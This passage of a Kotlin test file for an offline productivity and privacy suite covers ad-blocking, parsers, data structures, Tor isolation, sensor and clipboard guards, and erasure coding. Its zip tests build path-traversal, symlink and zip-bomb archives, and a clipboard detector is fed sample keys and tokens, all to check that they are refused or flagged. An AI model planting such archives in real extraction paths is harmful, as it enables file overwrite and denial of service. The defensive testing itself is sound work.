        // Third-party tracker blocked; first-party not blocked; suffix-spoof domain NOT falsely blocked!
        checkTrue(
            eng.matchNetwork(AdblockFilterEngine.RequestContext("https://ad.doubleclick.example.net/tag.js", "news.example.org", AdblockFilterEngine.ResourceType.SCRIPT)).blocked,
            "3p subdomain blocked",
        )
        checkTrue(
            !eng.matchNetwork(AdblockFilterEngine.RequestContext("https://notdoubleclick.example.net/tag.js", "news.example.org", AdblockFilterEngine.ResourceType.SCRIPT)).blocked,
            "Suffix spoof domain not falsely blocked",
        )
        checkTrue(
            eng.matchNetwork(AdblockFilterEngine.RequestContext("https://analytics.tracker.test/collect", "shop.test", AdblockFilterEngine.ResourceType.XMLHTTPREQUEST)).blocked,
            "XHR blocked",
        )
        val exc = eng.matchNetwork(AdblockFilterEngine.RequestContext("https://allow.analytics.tracker.test/sdk.js", "shop.test", AdblockFilterEngine.ResourceType.SCRIPT))
        checkTrue(!exc.blocked && exc.isException, "@@ exception overrides block")
        val cosMain = eng.cosmeticSelectorsForDomain("sub.news.example.org")
        checkTrue(".sponsored-banner" in cosMain && ".paywall-modal" in cosMain && ".keep-visible" !in cosMain, "Cosmetic ## and #@#")
        val cosPartner = eng.cosmeticSelectorsForDomain("partner.news.example.org")
        checkTrue(".paywall-modal" !in cosPartner, "~domain cosmetic exclusion")
    }

    private fun testJsonPatchRfc6902Fixture(fixtureDir: File) {
        val doc = JsonPatchRfc6902.parseJson("""{"suite":"Fusion","round":46,"features":["docx"],"legacy":true,"a/b~c":9}""")
        checkNear((JsonPatchRfc6902.resolve(doc, "/a~1b~0c") as JsonPatchRfc6902.JsonVal.JNum).v, 9.0, msg = "RFC 6901 ~1 and ~0")
        val ops = JsonPatchRfc6902.parsePatchOps(File(fixtureDir, "rfc6902_patch.json").readText())
        val patched = JsonPatchRfc6902.apply(doc, ops)
        checkNear((JsonPatchRfc6902.resolve(patched, "/round") as JsonPatchRfc6902.JsonVal.JNum).v, 47.0, msg = "RFC 6902 replace")
        checkTrue((JsonPatchRfc6902.resolve(patched, "/features/1") as JsonPatchRfc6902.JsonVal.JStr).v == "xlsx-styled", "RFC 6902 '-' append")
        checkTrue((JsonPatchRfc6902.resolve(patched, "/backupSuite") as JsonPatchRfc6902.JsonVal.JStr).v == "Fusion", "RFC 6902 copy")
        checkThrows("Removed key '/legacy' absent") { JsonPatchRfc6902.resolve(patched, "/legacy") }

        // Atomic rollback on failing `test` op
        val failingOps = JsonPatchRfc6902.parsePatchOps("""[{"op":"replace","path":"/round","value":99},{"op":"test","path":"/suite","value":"Wrong"}]""")
        checkThrows("Failing RFC 6902 test op throws") { JsonPatchRfc6902.apply(patched, failingOps) }
        checkNear((JsonPatchRfc6902.resolve(patched, "/round") as JsonPatchRfc6902.JsonVal.JNum).v, 47.0, msg = "Original immutable doc intact")
    }

    private fun testArgvSpecParserAndTypoHint() {
        val spec = ArgvSpecParser.CommandSpec(
            name = "fusion",
            summary = "Fusion CLI",
            subcommands = listOf(
                ArgvSpecParser.CommandSpec(
                    name = "export",
                    summary = "Export document",
                    options = listOf(
                        ArgvSpecParser.OptSpec("verbose", 'v'),
                        ArgvSpecParser.OptSpec("force", 'f'),
                        ArgvSpecParser.OptSpec("output", 'o', takesValue = true),
                        ArgvSpecParser.OptSpec("tag", 't', takesValue = true, repeatable = true),
                    ),
                ),
            ),
        )
        val parsed = ArgvSpecParser.parse(spec, listOf("export", "-vfo", "out.pdf", "--tag=a", "--tag", "b", "--no-force", "--", "-literal.md"))
        checkTrue(parsed.commandPath == listOf("fusion", "export"), "Subcommand path")
        checkTrue(parsed.flag("verbose") && !parsed.flag("force"), "-vf then --no-force")
        checkTrue(parsed.singleValue("output") == "out.pdf", "-vfo bundled value")
        checkTrue(parsed.values["tag"] == listOf("a", "b"), "Repeatable --tag")
        checkTrue(parsed.positionals == listOf("-literal.md"), "-- sentinel preserves leading dash positional")

        var hintMsg = ""
        try {
            ArgvSpecParser.parse(spec, listOf("export", "--verbos"))
        } catch (e: ArgvSpecParser.CliParseException) {
            hintMsg = e.message ?: ""
        }
        checkTrue(hintMsg.contains("--verbose"), "Levenshtein typo suggestion: $hintMsg")
    }

    private fun testHdrLatencyHistAndCoordinatedOmission() {
        val h1 = HdrLatencyHist()
        for (i in 1..1_000) h1.recordValue(i * 1_000L) // 1 us .. 1000 us
        checkTrue(h1.totalCount == 1_000L, "Hdr count=1000")
        val p50 = h1.valueAtPercentile(50.0)
        val p99 = h1.valueAtPercentile(99.0)
        checkTrue(p50 in 495_000L..508_000L, "Hdr p50 within 0.8% sub-bucket bound: $p50")
        checkTrue(p99 in 985_000L..998_000L, "Hdr p99 within sub-bucket bound: $p99")

        // Coordinated Omission: 100 fast 1ms probes + 1 stalled 100ms probe on 10ms interval -> backfills 9 stalled intervals!
        val rawHist = HdrLatencyHist()
        val corrHist = HdrLatencyHist()
        repeat(100) {
            rawHist.recordValue(1_000_000L)
            corrHist.recordCorrectedValue(1_000_000L, expectedInterval = 10_000_000L)
        }
        rawHist.recordValue(100_000_000L)
        corrHist.recordCorrectedValue(100_000_000L, expectedInterval = 10_000_000L)
        checkTrue(corrHist.totalCount == 110L && corrHist.valueAtPercentile(95.0) >= 40_000_000L, "Coordinated Omission reveals p95 stall")
    }

    private fun testBTreePageIndexPropertySweep() {
        val tree = BTreePageIndex<Int, String>(maxKeysPerNode = 5)
        val rng = Random(47_2026)
        val order = (1..220).shuffled(rng)
        for (k in order) {
            tree.put(k, "v-$k")
            if (k % 20 == 0) checkTrue(tree.verifyInvariants(), "B+Tree invariants during insert k=$k")
        }
        checkTrue(tree.size == 220 && tree.verifyInvariants(), "B+Tree full 220 invariants")
        for (k in 1..220) {
            checkTrue(tree.get(k) == "v-$k", "B+Tree exact lookup k=$k")
        }
        val slice = tree.rangeScan(50, 74)
        checkTrue(slice.map { it.first } == (50..74).toList(), "B+Tree linked-leaf rangeScan 50..74")
        for (k in (1..220 step 3)) tree.remove(k)
        checkTrue(tree.verifyInvariants() && tree.get(4) == null && tree.get(5) == "v-5", "B+Tree post-delete invariants")
    }

    private fun testZipSafeExtractSymlinkBombSlip() {
        // 1. Valid archive
        val cleanZip = ByteArrayOutputStream().also { baos ->
            ZipOutputStream(baos).use { zos ->
                zos.putNextEntry(ZipEntry("docs/readme.txt"))
                zos.write("Safe payload".toByteArray())
                zos.closeEntry()
            }
        }.toByteArray()
        val extracted = ZipSafeExtract.extractSafe(cleanZip)
        checkTrue(String(extracted.getValue("docs/readme.txt")) == "Safe payload", "Clean ZIP extracts")

        // 2. Zip-Slip "../escape.sh" refused
        val slipZip = ByteArrayOutputStream().also { baos ->
            ZipOutputStream(baos).use { zos ->
                zos.putNextEntry(ZipEntry("docs/../../escape.sh"))
                zos.write("id".toByteArray())
                zos.closeEntry()
            }
        }.toByteArray()
        checkThrows("Zip-Slip traversal refused") { ZipSafeExtract.extractSafe(slipZip) }

        // 3. Symlink S_IFLNK (0xA1FF in upper 16 bits of Central Directory external attributes) refused!
        val symlinkZip = cleanZip.copyOf()
        val bb = ByteBuffer.wrap(symlinkZip).order(ByteOrder.LITTLE_ENDIAN)
        for (i in 0..symlinkZip.size - 46) {
            if (bb.getInt(i) == ZipSafeExtract.CEN_SIG) {
                bb.putInt(i + 38, (0xA1FF shl 16))
                break
            }
        }
        checkThrows("POSIX S_IFLNK symlink entry refused") { ZipSafeExtract.extractSafe(symlinkZip) }

        // 4. Zip-Bomb high compression ratio (200 KB of zeros -> >250x ratio vs policy maxCompressionRatio=20.0) refused!
        val bombZip = ByteArrayOutputStream().also { baos ->
            ZipOutputStream(baos).use { zos ->
                zos.putNextEntry(ZipEntry("zeros.bin"))
                zos.write(ByteArray(200_000))
                zos.closeEntry()
            }
        }.toByteArray()
        checkThrows("Zip-Bomb ratio refused") {
            ZipSafeExtract.extractSafe(bombZip, ZipSafeExtract.Policy(maxCompressionRatio = 20.0))
        }
    }

    private fun testTomlConfigCodecFixture(fixtureDir: File) {
        val parsed = TomlConfigCodec.parse(File(fixtureDir, "profile.toml").readText())
        checkTrue((TomlConfigCodec.getAt(parsed, "profile_name") as TomlConfigCodec.TomlVal.Str).v == "tails-light-r47", "TOML str")
        checkTrue((TomlConfigCodec.getAt(parsed, "network.tor.socks_user") as TomlConfigCodec.TomlVal.Str).v == "<torS0X>0", "TOML nested")
        val ports = (TomlConfigCodec.getAt(parsed, "network.tor.allowed_ports") as TomlConfigCodec.TomlVal.Arr).items
        checkTrue(ports.size == 3 && (ports[2] as TomlConfigCodec.TomlVal.Int64).v == 9050L, "TOML array")
        val canon = TomlConfigCodec.formatCanonical(parsed)
        val reparsed = TomlConfigCodec.parse(canon)
        checkTrue(TomlConfigCodec.formatCanonical(reparsed) == canon, "TOML canonical idempotency")
        checkThrows("Duplicate TOML key refused") { TomlConfigCodec.parse("a = 1\na = 2") }
    }

    private fun testTorSocksIsolationProp351() {
        val secret = ByteArray(32) { (it * 7 + 3).toByte() }
        val c1 = TorSocksIsolation.deriveProp351Credentials(secret, TorSocksIsolation.StreamContext("browser", "https://duckduckgo.com", 1))
        val c2 = TorSocksIsolation.deriveProp351Credentials(secret, TorSocksIsolation.StreamContext("browser", "https://nytimes.com", 1))
        val c3 = TorSocksIsolation.deriveProp351Credentials(secret, TorSocksIsolation.StreamContext("rss", "https://duckduckgo.com", 1))
        checkTrue(c1.username == "<torS0X>0" && c1.passwordHex.length == 64, "Tor Prop 351 <torS0X>0 header")
        checkTrue(c1.passwordHex != c2.passwordHex && c1.passwordHex != c3.passwordHex, "Cross-origin & cross-app circuit isolation")

        // Proposal 351 responder rule: <torS0X> with unknown version suffix MUST fail closed!
        checkTrue(TorSocksIsolation.validateProp351Auth("<torS0X>0", c1.passwordHex), "<torS0X>0 accepted")
        checkTrue(!TorSocksIsolation.validateProp351Auth("<torS0X>1", c1.passwordHex), "<torS0X>1 rejected fail-closed")
        checkTrue(!TorSocksIsolation.validateProp351Auth("<torS0X>", c1.passwordHex), "bare <torS0X> rejected")

        val onion56 = "a".repeat(56) + ".onion"
        val frame = TorSocksIsolation.buildDomainConnectFrame(onion56, 443)
        checkTrue(frame[0] == 0x05.toByte() && frame[3] == 0x03.toByte() && frame[4] == 62.toByte(), "SOCKS5 ATYP=0x03 v3 onion")
        checkThrows("Deprecated v2 16-char .onion refused") {
            TorSocksIsolation.buildDomainConnectFrame("abcdefghijklmnop.onion", 80)
        }
        checkThrows("Raw IPv4 literal refused in strict domain-isolation mode") {
            TorSocksIsolation.buildDomainConnectFrame("1.1.1.1", 443)
        }

        val tracker = TorSocksIsolation.CircuitExpirationTracker(maxIdleMs = 600_000L)
        tracker.onStreamOpened(c1.passwordHex, 1_000L)
        checkTrue(tracker.evictExpiredTokens(900_000L).isEmpty(), "Open stream never evicted")
        tracker.onStreamClosed(c1.passwordHex, 900_000L)
        checkTrue(c1.passwordHex in tracker.evictExpiredTokens(1_500_001L), "Prop 368 idle circuit expired")
    }

    private fun testImuSideChannelGuardGlitchInTimeAndAlphaLogger() {
        val gate = ImuSideChannelGuard.SessionGate(maxUnfocusedHz = 10, quantStep = 0.25)

        // 1. Complete blackout during text/secret focus (defeats AlphaLogger 10Hz keystroke inference!)
        for (s in ImuSideChannelGuard.SensorKind.entries) {
            val d = gate.evaluateSample(s, 1_000_000_000L, 0.13, -9.81, 0.04, appInForeground = true, textOrSecretFocused = true)
            checkTrue(!d.allowed && d.verdict == ImuSideChannelGuard.VerdictKind.DROP_TEXT_ENTRY_BLACKOUT, "IMU blackout on $s")
        }

        // 2. Unfocused single-sensor sample quantized & rate-limited to <= 10 Hz
        val ok1 = gate.evaluateSample(ImuSideChannelGuard.SensorKind.ACCELEROMETER, 2_000_000_000L, 0.12, 9.81, -0.07, true, false)
        checkTrue(ok1.allowed && ok1.quantizedX == 0.0 && ok1.quantizedY == 9.75, "Accelerometer quantized to 0.25")

        // 3. Glitch in Time (2024) 2.5ms phase-offset gyroscope interleaving MUST be dropped!
        val glitch = gate.evaluateSample(ImuSideChannelGuard.SensorKind.GYROSCOPE, 2_002_500_000L, 0.02, 0.01, 0.03, true, false)
        checkTrue(!glitch.allowed && glitch.verdict == ImuSideChannelGuard.VerdictKind.DROP_MULTI_SENSOR_FUSION, "Glitch-in-Time gyro interleave blocked")

        // 4. Rate-limit drop within 100ms window
        val fast = gate.evaluateSample(ImuSideChannelGuard.SensorKind.ACCELEROMETER, 2_050_000_000L, 0.1, 9.8, 0.0, true, false)
        checkTrue(!fast.allowed && fast.verdict == ImuSideChannelGuard.VerdictKind.DROP_RATE_LIMIT, "20Hz sample dropped under 10Hz cap")
    }

    private fun testSecureKeypadScramblerUniformityAndAx() {
        val rng = SecureRandom(byteArrayOf(4, 7, 2, 0, 2, 6))
        val firstRowZeroDigitSet = mutableSetOf<String>()
        repeat(40) {
            val pad = SecureKeypadScrambler.generatePinPad(rng)
            checkTrue(pad.cells.size == 12, "PIN pad has 12 cells")
            val labels = pad.cells.map { it.label }.toSet()
            checkTrue((0..9).all { it.toString() in labels } && "OK" in labels && "BACKSPACE" in labels, "All 10 digits + OK + BACKSPACE")
            pad.cells.forEach { c ->
                checkTrue(c.widthDp >= 48.0 && c.heightDp >= 48.0, "Every scrambled key >= 48dp AX minimum")
                val hit = pad.resolveTouchConstantScan((c.leftDp + c.rightDp) / 2.0, (c.topDp + c.bottomDp) / 2.0)
                checkTrue(hit == c.label, "Constant-scan hit test resolves ${c.label}")
            }
            firstRowZeroDigitSet.add(pad.cells[0].label)
        }
        checkTrue(firstRowZeroDigitSet.size >= 6, "Top-left cell scrambles across >=6 distinct digits over 40 layouts")
    }

    private fun testClipboardSensitiveGuardAndTtl() {
        checkTrue(ClipboardSensitiveGuard.classify("-----BEGIN OPENSSH PRIVATE KEY-----\nabc").reason == ClipboardSensitiveGuard.SensitivityReason.PEM_PRIVATE_KEY)
        checkTrue(ClipboardSensitiveGuard.classify("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U").reason == ClipboardSensitiveGuard.SensitivityReason.JWT_BEARER_TOKEN)
        checkTrue(ClipboardSensitiveGuard.classify("ghp_1234567890abcdefghijklmnopqrstuvwx").reason == ClipboardSensitiveGuard.SensitivityReason.API_SECRET_PREFIX)
        checkTrue(ClipboardSensitiveGuard.classify("abandon ability able about above absent absorb abstract absurd abuse access accident").reason == ClipboardSensitiveGuard.SensitivityReason.MNEMONIC_PHRASE)
        checkTrue(!ClipboardSensitiveGuard.classify("Meeting tomorrow at 3pm in Room B").isSensitive, "Plain sentence not false-flagged")

        val buf = ClipboardSensitiveGuard.GuardedClipBuffer(sensitiveTtlMs = 30_000L)
        buf.put("sk-proj_9876543210abcdefghijklmno", nowMs = 1_000L)
        checkTrue(buf.extraIsSensitive && buf.readIfLive(29_999L) != null, "Secret live before TTL")
        checkTrue(buf.readIfLive(31_000L) == null && !buf.extraIsSensitive, "Secret zeroized at TTL=31s")
    }

    private fun testImeTrustGateMatrix() {
        val sysOffline = ImeTrustGate.ImeDescriptor("com.android.inputmethod.latin", true, false, true, "aa11")
        val netThirdParty = ImeTrustGate.ImeDescriptor("com.cloud.smartkbd", false, true, false, "bb22")
        checkTrue(
            ImeTrustGate.evaluate(sysOffline, ImeTrustGate.FieldSensitivity.SECRET_PIN_OR_PASSPHRASE, setOf("aa11")).mode ==
                ImeTrustGate.InputMode.ALLOW_SYSTEM_IME_INCOGNITO,
            "Verified offline system IME allowed",
        )
        checkTrue(
            ImeTrustGate.evaluate(netThirdParty, ImeTrustGate.FieldSensitivity.SECRET_PIN_OR_PASSPHRASE).mode ==
                ImeTrustGate.InputMode.FORCE_IN_APP_SCRAMBLED_PAD,
            "Third-party network IME forced to in-app scrambled pad",
        )
    }

    private fun testRamWipeScheduleZeroization() {
        val key = byteArrayOf(0x41, 0x42, 0x43, 0x44)
        val pass = charArrayOf('s', 'e', 'c', 'r', 'e', 't')
        val doc = byteArrayOf(1, 2, 3, 4, 5, 6, 7, 8)
        val sched = RamWipeSchedule()
        sched.registerBytes(RamWipeSchedule.Stage.DOCUMENT_SCRATCH, "writer-buf", doc)
        sched.registerChars(RamWipeSchedule.Stage.CLIPBOARD_SENSITIVE, "clip-pass", pass)
        sched.registerBytes(RamWipeSchedule.Stage.SESSION_CRYPTO_KEYS, "vault-dek", key)
        val rep = sched.executePanicWipe("USB_UNEXPECTED_DETACH")
        checkTrue(rep.allVerifiedZero && rep.totalBytesScrubbed == 4 + 12 + 8, "All 24 bytes scrubbed & verified zero")
        checkTrue(rep.receipts.first().stage == RamWipeSchedule.Stage.SESSION_CRYPTO_KEYS, "Keys wiped BEFORE scratch buffers")
        checkTrue(key.all { it == 0.toByte() } && pass.all { it == '\u0000' } && doc.all { it == 0.toByte() }, "Caller arrays zeroed in-place")
    }

    private fun testScreenReaderRedactorStalkerwareVsTalkBack() {
        val talkBack = ScreenReaderRedactor.BoundA11yService("com.google.android.marvin.talkback", true, true, true, "cafe")
        val stalker = ScreenReaderRedactor.BoundA11yService("com. shady.autoclicker", false, false, true, "dead")
        val tbRes = ScreenReaderRedactor.evaluateNode("Draft memo", false, true, listOf(talkBack), setOf("cafe"))
        checkTrue(tbRes.action == ScreenReaderRedactor.Action.ALLOW_FULL_AX && tbRes.exposedText == "Draft memo", "Verified TalkBack reads private doc")

        val blocked = ScreenReaderRedactor.evaluateNode("TopSecret123", true, true, listOf(talkBack, stalker), setOf("cafe"))
        checkTrue(
            blocked.action == ScreenReaderRedactor.Action.REDACT_UNTRUSTED_ACCESSIBILITY_SCRAPER &&
                !blocked.exposedText.contains("TopSecret") && blocked.suppressTextChangeEvents,
            "Sideloaded a11y scraper triggers node redaction + event suppression",
        )
    }

    private fun testSecureSurfacePolicyRoutes() {
        val vault = SecureSurfacePolicy.forRoute(SecureSurfacePolicy.SurfaceRoute.VAULT_PASSPHRASE_PROMPT)
        checkTrue(vault.flagSecure && vault.hideOverlayWindows && vault.windowFlagsMask == 0x2000, "Vault sets FLAG_SECURE + hideOverlayWindows")
        checkTrue(!vault.shouldAcceptMotionEvent(SecureSurfacePolicy.MOTION_FLAG_WINDOW_IS_OBSCURED), "Obscured tapjacking touch rejected")
        checkTrue(vault.shouldAcceptMotionEvent(0), "Unobscured touch accepted")
    }

    private fun testFluidTypeClampReflow() {
        val mobile = FluidTypeClamp.fullRamp(360.0, userFontScale = 1.0)
        val desktop = FluidTypeClamp.fullRamp(1440.0, userFontScale = 1.0)
        val zoomed200 = FluidTypeClamp.fullRamp(360.0, userFontScale = 2.0)
        checkNear(mobile.getValue(FluidTypeClamp.TypeRole.BODY).fontSizeSp, 14.0, msg = "360dp body=14sp")
        checkNear(desktop.getValue(FluidTypeClamp.TypeRole.BODY).fontSizeSp, 17.0, msg = "1440dp body=17sp")
        checkNear(zoomed200.getValue(FluidTypeClamp.TypeRole.BODY).fontSizeSp, 28.0, msg = "WCAG 1.4.4 200% body=28sp")
        checkTrue(zoomed200.getValue(FluidTypeClamp.TypeRole.DISPLAY).fontSizeSp <= 360.0 * 0.16 + 1e-6, "Display clamped against 360dp overflow")
    }

    private fun testFuzzyAppSearchRanking() {
        val apps = listOf(
            FuzzyAppSearch.Entry("calc", "Fusion Spreadsheet"),
            FuzzyAppSearch.Entry("files", "File Synchronizer"),
            FuzzyAppSearch.Entry("tor", "Tor Browser"),
            FuzzyAppSearch.Entry("notes", "Fast Scratchpad"),
        )
        val hits = FuzzyAppSearch.search("fs", apps)
        checkTrue(hits.isNotEmpty() && hits.first().entry.id in setOf("calc", "files", "notes"), "Acronym boundary match")
        val exact = FuzzyAppSearch.search("tor", apps)
        checkTrue(exact.first().entry.id == "tor" && exact.first().matchedIndices == listOf(0, 1, 2), "Prefix match outranks")
    }

    private fun testBooleanQueryAstSearch() {
        val q = BooleanQueryAst.parse("""(budget OR "cash flow") AND ext:xlsx -draft""")
        val d1 = BooleanQueryAst.SearchableDoc("1", "Annual cash flow projection", mapOf("ext" to setOf("xlsx")))
        val d2 = BooleanQueryAst.SearchableDoc("2", "Annual budget draft", mapOf("ext" to setOf("xlsx")))
        val d3 = BooleanQueryAst.SearchableDoc("3", "Annual budget final", mapOf("ext" to setOf("docx")))
        checkTrue(BooleanQueryAst.matches(q, d1), "d1 matches phrase + ext:xlsx + not draft")
        checkTrue(!BooleanQueryAst.matches(q, d2), "d2 excluded by -draft")
        checkTrue(!BooleanQueryAst.matches(q, d3), "d3 excluded by ext:xlsx")
    }

    private fun testExtendedGlobPolynomial() {
        checkTrue(ExtendedGlob.matches("docs/**/*.{docx,xlsx,pdf}", "docs/2026/q4/budget.xlsx"), "Globstar + brace match")
        checkTrue(ExtendedGlob.matches("docs/**/*.{docx,xlsx,pdf}", "docs/report.pdf"), "Globstar zero-dir match")
        checkTrue(!ExtendedGlob.matches("docs/*.pdf", "docs/sub/report.pdf"), "Single * does not cross /")
        checkTrue(ExtendedGlob.matches("chap[!0-9].md", "chapA.md") && !ExtendedGlob.matches("chap[!0-9].md", "chap3.md"), "Negated char class")
        // Adversarial ReDoS string completes instantaneously in O(P*S)
        val advPat = "*a*a*a*a*a*a*a*a*b"
        val advStr = "a".repeat(80) + "c"
        checkTrue(!ExtendedGlob.matches(advPat, advStr), "Adversarial non-matching glob finishes in polynomial DP")
    }

    private fun testPromptOsc133Terminal() {
        val esc = "\u001B"
        val bel = "\u0007"
        val stream = "${esc}]7;file://host/home/user/OSB${bel}" +
            "${esc}]133;A${bel}user@fusion:~/OSB$ ${esc}]133;B${bel}ls -la\n" +
            "${esc}]133;C${bel}README.md\nandroid\n${esc}]133;D;0${bel}" +
            "${esc}]133;A${esc}\\$ ${esc}]133;B${esc}\\false${esc}]133;C${esc}\\${esc}]133;D;1${esc}\\"
        val res = PromptOsc133.parseStream(stream)
        checkTrue(res.lastCwd == "/home/user/OSB", "OSC 7 cwd parsed")
        checkTrue(res.completedBlocks.size == 2, "2 OSC 133 blocks parsed (BEL and ST)")
        checkTrue(res.completedBlocks[0].command == "ls -la" && res.completedBlocks[0].succeeded, "Block 0 exit=0")
        checkTrue(res.completedBlocks[1].command == "false" && res.completedBlocks[1].exitCode == 1, "Block 1 exit=1")
    }

    private fun testWebVttCueParserFixture(fixtureDir: File) {
        val track = WebVttCueParser.parse(File(fixtureDir, "sample_captions.vtt").readText())
        checkTrue(track.cues.size == 2, "2 WebVTT cues parsed (NOTE skipped)")
        checkTrue(track.cues[0].text == "Welcome to Fusion Shell & Offline Suite.", "Tags stripped + entities decoded")
        checkTrue(track.activeCuesAt(2_000L).single().id == "cue-1", "activeCuesAt 2.0s")
        checkTrue(track.activeCuesAt(3_724_000L).single().id == "cue-2", "activeCuesAt 01:02:04")
    }

    private fun testGeoJsonFeatureFixture(fixtureDir: File) {
        val feats = GeoJsonFeature.parseFeatureCollection(File(fixtureDir, "trail.geojson").readText())
        checkTrue(feats.size == 3, "3 GeoJSON features")
        val bbox = GeoJsonFeature.computeBBox(feats)
        checkNear(bbox.west, -81.530, msg = "BBox west")
        checkNear(bbox.north, 41.480, msg = "BBox north")
        val line = feats[1].geometry as GeoJsonFeature.Geometry.LineString
        val len = GeoJsonFeature.lineLengthMeters(line)
        checkTrue(len in 1_900.0..2_200.0, "Cleveland Haversine segment length ~2.0km: $len")
        val poly = feats[2].geometry as GeoJsonFeature.Geometry.Polygon
        checkTrue(GeoJsonFeature.containsPoint(poly, GeoJsonFeature.LonLat(-81.509, 41.464)), "HQ inside zone-a")
        checkTrue(!GeoJsonFeature.containsPoint(poly, GeoJsonFeature.LonLat(-81.600, 41.464)), "Point outside zone-a")
    }

    private fun testReedSolomonGf256ErasureProperty() {
        val rs = ReedSolomonGf256(dataShards = 5, parityShards = 3)
        val rng = Random(47)
        val original = List(5) { ByteArray(256) { rng.nextInt(256).toByte() } }
        val encoded = rs.encode(original)
        checkTrue(encoded.size == 8, "5+3 = 8 Reed-Solomon shards")

        // Exhaustively test ALL C(8, 3) = 56 three-shard erasure combinations!
        for (a in 0 until 6) {
            for (b in (a + 1) until 7) {
                for (c in (b + 1) until 8) {
                    val damaged: List<ByteArray?> = encoded.mapIndexed { idx, sh ->
                        if (idx == a || idx == b || idx == c) null else sh
                    }
                    val recovered = rs.reconstructData(damaged)
                    val allMatch = (0 until 5).all { original[it].contentEquals(recovered[it]) }
                    checkTrue(allMatch, "RS(5,3) exact recovery erasing ($a,$b,$c)")
                }
            }
        }
    }

    private fun testMaintenanceSilenceSecurityFloor() {
        val rule = MaintenanceSilence.SilenceRule(
            id = "sil-backup",
            matchers = listOf(MaintenanceSilence.LabelMatcher("job", MaintenanceSilence.MatchOp.GLOB_EQ, "backup-*")),
            startsAtMs = 1_000L,
            endsAtMs = 5_000L,
            createdBy = "ops",
            comment = "Nightly USB archive",
        )
        checkTrue(MaintenanceSilence.evaluateAlert(mapOf("job" to "backup-usb"), listOf(rule), 2_500L).silenced, "Planned backup silenced")
        checkTrue(!MaintenanceSilence.evaluateAlert(mapOf("job" to "backup-usb", "severity" to "critical_security"), listOf(rule), 2_500L).silenced, "critical_security NEVER silenced")
    }

    private fun testWavPcmHeaderAndAudioMeter(artifactDir: File?) {
        val sr = 16_000
        val samples = ShortArray(1600) { i -> (kotlin.math.sin(2.0 * Math.PI * 440.0 * i / sr) * 16384.0).toInt().toShort() }
        val wav = WavPcmHeader.encodePcm16Mono(sr, samples)
        artifactDir?.let { File(it, "tone_440hz.wav").writeBytes(wav) }
        val fmt = WavPcmHeader.decodeHeader(wav)
        checkTrue(fmt.sampleRateHz == 16_000 && fmt.channels == 1 && fmt.frameCount == 1600, "WAV header round-trip")
        val stats = WavPcmHeader.analyzePcm16(samples)
        checkTrue(stats.peakDbfs in -6.2..-5.8 && stats.rmsDbfs in -9.2..-8.8 && stats.clippedSamples == 0, "440Hz half-scale sine RMS=-9dBFS, Peak=-6dBFS")
    }

    private fun testPackIndexCompactGitV2(artifactDir: File?) {
        val entries = (1..40).map { i ->
            val shaHex = String.format("%02x%038x", (i * 6) and 0xFF, i * 1_000_003L)
            val off = if (i == 40) 0x1_2000_0000L else i * 4096L // Includes >2GiB 64-bit offset!
            PackIndexCompact.PackEntry(shaHex, crc32 = i * 17, packOffset = off)
        }
        val packSum = "ab".repeat(20)
        val idxBytes = PackIndexCompact.writeIdxV2(entries, packSum)
        artifactDir?.let { File(it, "sample_pack.idx").writeBytes(idxBytes) }
        val reader = PackIndexCompact.Reader(idxBytes)
        checkTrue(reader.objectCount == 40, "Git .idx v2 count=40")
        for (e in entries) {
            val hit = reader.find(e.oidHex)
            checkTrue(hit != null && hit.packOffset == e.packOffset && hit.crc32 == e.crc32, "Git .idx v2 O(log N) lookup ${e.oidHex}")
        }
        checkTrue(reader.find("ff".repeat(20)) == null, "Missing OID returns null")
        val corrupted = idxBytes.copyOf().also { it[20] = (it[20].toInt() xor 0x01).toByte() }
        checkThrows("Corrupted Git .idx v2 fails trailer SHA-1") { PackIndexCompact.Reader(corrupted) }
    }

    private fun testNoiseFramingTransportAndReplay() {
        val key = ByteArray(32) { (it + 1).toByte() }
        val tx = NoiseFraming.CipherState(key)
        val rx = NoiseFraming.CipherState(key)
        val win = NoiseFraming.ReplayWindow()

        val f0 = tx.writeTransportFrame("msg-0".toByteArray(), "hdr".toByteArray())
        val f1 = tx.writeTransportFrame("msg-1".toByteArray(), "hdr".toByteArray())
        // Deliver out of order (f1 then f0) -> both succeed; replay of f1 -> rejected!
        checkTrue(String(rx.readTransportFrame(f1, win, "hdr".toByteArray())) == "msg-1", "Out-of-order f1 decrypted")
        checkTrue(String(rx.readTransportFrame(f0, win, "hdr".toByteArray())) == "msg-0", "Out-of-order f0 decrypted")
        checkThrows("Replay of f1 rejected before commit") { rx.readTransportFrame(f1, win, "hdr".toByteArray()) }

        // Synchronized Noise §4.2 rekey()
        tx.rekey(); rx.rekey()
        val fRekeyed = tx.writeTransportFrame("post-rekey".toByteArray())
        checkTrue(String(rx.readTransportFrame(fRekeyed)) == "post-rekey", "Noise §4.2 rekey synchronized")
    }

    private fun testRgaTextSequenceCommutativityProperty() {
        val a = RgaTextSequence("replica-A")
        val b = RgaTextSequence("replica-B")
        val c = RgaTextSequence("replica-C")

        val op1 = a.localInsert(0, 'H')
        val op2 = a.localInsert(1, 'i')
        b.apply(op1); b.apply(op2)
        c.apply(op1); c.apply(op2)

        // Concurrent edits on "Hi": A inserts '!' at end, B inserts 'X' after 'H', C deletes 'i' and inserts 'o' after 'H'
        val opA = a.localInsert(2, '!')
        val opB = b.localInsert(1, 'X')
        val opCDel = c.localDelete(1)
        val opCIns = c.localInsert(1, 'o')
        val allOps = listOf(op1, op2, opA, opB, opCDel, opCIns)

        val rng = Random(20261026)
        var referenceText: String? = null
        // Verify 50 randomized delivery permutations (including causal-out-of-order arrivals + duplicates!)
        repeat(50) { trial ->
            val peer = RgaTextSequence("verifier-$trial")
            val shuffled = (allOps + listOf(opA, opCDel)).shuffled(rng)
            for (op in shuffled) peer.apply(op)
            val txt = peer.visibleText()
            if (referenceText == null) referenceText = txt
            checkTrue(txt == referenceText, "RGA CRDT convergence trial=$trial: '$txt' == '$referenceText'")
        }
    }

    private fun testMrzIcao9303Td3AndTd1() {
        // ICAO Doc 9303 Part 4 official Erikson specimen TD3 passport
        val td3 = listOf(
            "P<UTOERIKSSON<<ANNA<MARIA<<<<<<<<<<<<<<<<<<<",
            "L898902C36UTO7408122F1204159ZE184226B<<<<<10",
        )
        val rec = MrzIcao9303.parse(td3)
        checkTrue(rec.checksumValid && rec.surname == "ERIKSSON" && rec.givenNames == "ANNA MARIA" && rec.documentNumber == "L898902C3", "ICAO 9303 TD3 specimen")

        // Single-character OCR flip on birth year invalidates check digit
